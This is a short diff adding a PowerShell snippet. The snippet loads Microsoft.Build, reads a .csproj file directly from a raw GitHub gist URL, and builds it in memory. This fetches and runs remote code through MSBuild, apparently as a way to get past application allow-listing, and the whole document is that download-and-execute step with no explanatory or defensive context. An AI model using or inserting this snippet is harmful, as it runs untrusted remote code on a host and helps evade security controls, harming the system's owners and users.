@@ -1,0 +1,4 @@
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
+$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/bohops/37f256ca83b9e0246cefbcc9d4fc597f/raw/f80b578797ce28d680bbaf831fe8765062c08483/JankyAF.csproj");
+$e=new-object Microsoft.Build.Evaluation.Project($proj);
+$e.Build();
